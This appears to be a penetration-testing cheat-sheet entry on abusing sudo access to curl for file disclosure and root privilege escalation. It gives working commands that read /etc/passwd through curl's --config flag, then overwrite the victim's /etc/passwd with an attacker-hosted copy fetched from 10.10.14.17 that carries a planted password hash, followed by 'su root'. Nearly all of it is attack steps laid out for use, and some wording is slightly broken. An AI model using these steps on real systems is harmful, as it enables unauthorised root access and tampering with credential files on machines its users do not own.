Curl

curl, short for “client URL,” is a command line tool used to transfer data to a specific server through its URL

File Leak

    Curl allow us to load a config file using the flag -K | --config

    Even though this seems fine you can perform... and /etc/passwd file will be prompted in the terminal

    sudo curl --config /etc/passwd

    Even though this seems inoffensive you can attempt to replace the /etc/passwd of the victims machine, follow the steps

      Generate an openssl password and hardcode it into the /etc/passwd file

      openssl passwd

      Copy the passwd from the victim, modify the first line adding the password into the X field and host the file using a web server with python

      kali:YOUR_HASHED_PASSWORD_HERE:1000:1000:,,,:/home/kali:/usr/bin/zsh

      Finally perform a curl from the victim computer gathering the file you are hosting and export the content into the real /etc/passwd file

      curl http://10.10.14.17/passwd -o /etc/passwd

      In order to check if the real /etc/passwd was modified you can list the contents of the file and finally perform a su root and passing the password you just created to login
